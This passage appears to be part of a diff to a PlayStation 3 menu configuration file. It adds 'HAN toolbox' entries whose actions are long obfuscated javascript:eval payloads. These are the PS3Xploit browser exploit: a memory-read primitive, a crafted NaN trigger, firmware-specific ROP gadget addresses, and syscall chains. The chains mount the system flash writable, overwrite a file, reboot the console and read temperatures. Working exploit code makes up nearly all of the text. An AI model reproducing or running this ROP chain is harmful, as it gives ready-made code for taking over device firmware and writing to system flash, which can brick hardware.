d=0;var e=hexh2bin(b);while(d\74a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+path_db_rebuild.convert()+hexw2bin(db_rebuild_bytes)+fill_by_16bytes(0x10,dbyte00)+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\74search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}path_db_rebuild_addr=xtra_data_addr+0x2;db_rebuild_bytes_addr=path_db_rebuild_addr+path_db_rebuild.convertedSize();size_validate_addr=db_rebuild_bytes_addr+0x4;stack_frame=stack_frame_hookup()+save_file_overwrite(path_db_rebuild_addr,gtemp_addr-0x1000,db_rebuild_bytes_addr,gtemp_addr-0x5000,0x4,gtemp_addr-0x8000)+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)+syscall(sc_sm_shutdown,soft_reboot,0,0,0,0,0,0,0)+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\74search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\74search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\74search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\74search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\74search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
+			</Table>
+			<Table key="han_flash_mounter_offline">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/net_eject.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_flash_mounter</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_flash_mounter_info</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=7296336,default_vsh_pub_toc=7263652,vsh_opd_patch=617820,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry1_addr=7185360,toc_entry2_addr=7494200,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255744,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332484,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380604,gadget7_addr=131024,gadget8_addr=131072,gadget_mod1_addr=6352696,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,hr="\74hr\76",gadget12_addr=0x0C864C,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),flash_partition1="xxxxCELL_FS_IOS:BUILTIN_FLSH1",filesystem_fat="CELL_FS_FAT",mount_path_blind="/dev_blind";document.write(\47\74html\76\74head\76\74title\76PS3Xploit - Flash Mounter\74/title\76\74/head\76\74body id="bodyId" style="background-color:#FFFFFF"\76\74div id="headerId"\76\74h1\76Mounting dev_flash to dev_blind...\74/h1\76\74div id="exploit"\76\74/div\76\74div id="trigger"\76\74/div\76\74/body\76\74/html\76\47);if(fwv=="4.84"){var toc_addr=7296344,default_vsh_pub_toc=7263660,vsh_opd_patch=617820,vsh_opd_addr=7256944,vsh_toc_addr_screenshot=7472764,vsh_ps3xploit_key_toc=7370860,toc_entry1_addr=7185360,toc_entry2_addr=7494456,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255752,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332644,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380764,gadget7_addr=131024,gadget8_addr=131072,gadget9_addr=170760,gadget10_addr=6479908,gadget11_addr=5874864,gadget12_addr=820812,gadget13_addr=4777384,gadget14_addr=4769696,gadget15_addr=4758664,gadget_mod1_addr=6352856,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod4b_addr=4376440,gadget_mod4c_addr=346864,gadget_mod5_addr=4339932,gadget_mod6_addr=134144,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,gadget_mod9_addr=68384,gadget_mod10_addr=1857428,gadget_mod11_addr=1618244,gadget_mod12_addr=6500860,gadget_mod13_addr=3369072,gadget_mod14_addr=6502656,gadget_mod15_addr=3788856,gadget_mod16_addr=5206828}function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\76\7616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\470000\47+this).substr(-4)};String.prototype.toAscii=function(a){var b=\47\47;var i=0;while(i\74this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\741){return\47\47}var b=\47\47;var c=\47\47;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}while(i\74b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\47\47)};String.prototype.convertedSize=function(a){if(this.length\741){return 0}var b=\47\47;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\47\47,sign=this\740?\47-\47:\47\47,str=a[0].replace(\47.\47,\47\47),mag=Number(a[1])+1;if(mag\740){z=sign+\470.\47;while(mag++){z+=\470\47}return z+str.replace(/^\-/,\47\47)}mag-=str.length;while(mag--){z+=\470\47}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\76\761}}g.reverse();var k=g.join(\47\47);var l=(1\74\74(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\74\74b)-1){d=f!==0?NaN:s*Infinity}else if(e\760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\76\7624)&0xFF,(a\76\7616)&0xFF,(a\76\768)&0xFF,(a)&0xFF,(b\76\7624)&0xFF,(b\76\7616)&0xFF,(b\76\768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\74\7432)|((b\76\761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\47exploit\47)){document.getElementById(\47exploit\47).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\47exploit\47)){readMemory(a,b);if(debug===true){var x=document.getElementById(\47exploit\47).style.src.substr(6,c);return x}return document.getElementById(\47exploit\47).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\47trigger\47)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){window.close()}function load_check(){if(total_loops\74max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\47exploit\47).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\74(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\74(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\74offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+flash_partition1.convert()+filesystem_fat.convert()+mount_path_blind.convert()+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\74search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}flash_partition1_addr=xtra_data_addr+0x6;filesystem_fat_addr=flash_partition1_addr+flash_partition1.convertedSize()-0x4;mount_path_blind_addr=filesystem_fat_addr+filesystem_fat.convertedSize();stack_frame=stack_frame_hookup()+syscall(0x345,flash_partition1_addr,filesystem_fat_addr,mount_path_blind_addr,0,0,0,0,0)+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\74search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\74search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\74search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\74search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\74search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
+			</Table>
+			<Table key="han_temperature_reader_offline">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/web_temp.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_temperature_reader</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_temperature_reader_info</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=7296336,default_vsh_pub_toc=7263652,vsh_opd_patch=617820,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry1_addr=7185360,toc_entry2_addr=7494200,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255744,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332484,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380604,gadget7_addr=131024,gadget8_addr=131072,gadget_mod1_addr=6352696,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,hr="\74hr\76",gadget12_addr=0x0C864C,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple"));document.write(\47\74html\76\74title\76PS3Xploit - Temperature Reader\74/title\76\74div id="exploit"\76\74/div\76\74div id="trigger"\76\74/div\76\74div id="temps"\76\74/div\76\74/html\76\47);document.getElementById("temps").innerHTML="\74h1\76Reading CELL & RSX temperature values...";if(fwv=="4.84"){var toc_addr=7296344,default_vsh_pub_toc=7263660,vsh_opd_patch=617820,vsh_opd_addr=7256944,vsh_toc_addr_screenshot=7472764,vsh_ps3xploit_key_toc=7370860,toc_entry1_addr=7185360,toc_entry2_addr=7494456,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255752,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332644,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380764,gadget7_addr=131024,gadget8_addr=131072,gadget9_addr=170760,gadget10_addr=6479908,gadget11_addr=5874864,gadget12_addr=820812,gadget13_addr=4777384,gadget14_addr=4769696,gadget15_addr=4758664,gadget_mod1_addr=6352856,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod4b_addr=4376440,gadget_mod4c_addr=346864,gadget_mod5_addr=4339932,gadget_mod6_addr=134144,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,gadget_mod9_addr=68384,gadget_mod10_addr=1857428,gadget_mod11_addr=1618244,gadget_mod12_addr=6500860,gadget_mod13_addr=3369072,gadget_mod14_addr=6502656,gadget_mod15_addr=3788856,gadget_mod16_addr=5206828}function hex16(s){return(\470000\47+s).slice(-4)}function s2hex(a){var b=[];var i=0;for(;i\74a.length;i++){b.push(hex16(a.charCodeAt(i).toString(16)))}return b.join("")}function showTemps(){temp_cell=checkTempMem(0x8C000100-0x8,0x100,0x100,10);temp_cell=s2hex(temp_cell).slice(0,4);temp_cell_hex=temp_cell.slice(0,2);temp_cell_hex_final=parseInt(temp_cell_hex,16).toString();temp_rsx=checkTempMem(0x8C000200-0x8,0x100,0x100,10);temp_rsx=s2hex(temp_rsx).slice(0,4);temp_rsx_hex=temp_rsx.slice(0,2);temp_rsx_hex_final=parseInt(temp_rsx_hex,16).toString();document.getElementById("temps").innerHTML="\74h1\76CELL: "+temp_cell_hex_final+"&#176;\74br\76RSX: "+temp_rsx_hex_final+"&#176;\74/h1\76"}function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\76\7616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\470000\47+this).substr(-4)};String.prototype.toAscii=function(a){var b=\47\47;var i=0;while(i\74this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\741){return\47\47}var b=\47\47;var c=\47\47;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}while(i\74b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\47\47)};String.prototype.convertedSize=function(a){if(this.length\741){return 0}var b=\47\47;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\47\47,sign=this\740?\47-\47:\47\47,str=a[0].replace(\47.\47,\47\47),mag=Number(a[1])+1;if(mag\740){z=sign+\470.\47;while(mag++){z+=\470\47}return z+str.replace(/^\-/,\47\47)}mag-=str.length;while(mag--){z+=\470\47}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\76\761}}g.reverse();var k=g.join(\47\47);var l=(1\74\74(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\74\74b)-1){d=f!==0?NaN:s*Infinity}else if(e\760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\76\7624)&0xFF,(a\76\7616)&0xFF,(a\76\768)&0xFF,(a)&0xFF,(b\76\7624)&0xFF,(b\76\7616)&0xFF,(b\76\768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\74\7432)|((b\76\761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\47exploit\47)){document.getElementById(\47exploit\47).style.src="local("+generateExploit(a,b)+")"}}function checkTempMem(a,b,c,d){if(document.getElementById(\47exploit\47)){readMemory(a,b);return document.getElementById(\47exploit\47).style.src.substr(d,c)}}function checkMemory(a,b,c){if(document.getElementById(\47exploit\47)){readMemory(a,b);return document.getElementById(\47exploit\47).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\47trigger\47)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function load_check(){if(total_loops\74max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\47exploit\47).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\74(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\74(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\74offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\74search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}stack_frame=stack_frame_hookup()+syscall(0x0000017F,0,0x8C000100,0,0,0,0,0,0)+syscall(0x0000017F,1,0x8C000200,0,0,0,0,0,0)+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\74search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\74search_size){load_check();return}jump_2=jump_2.r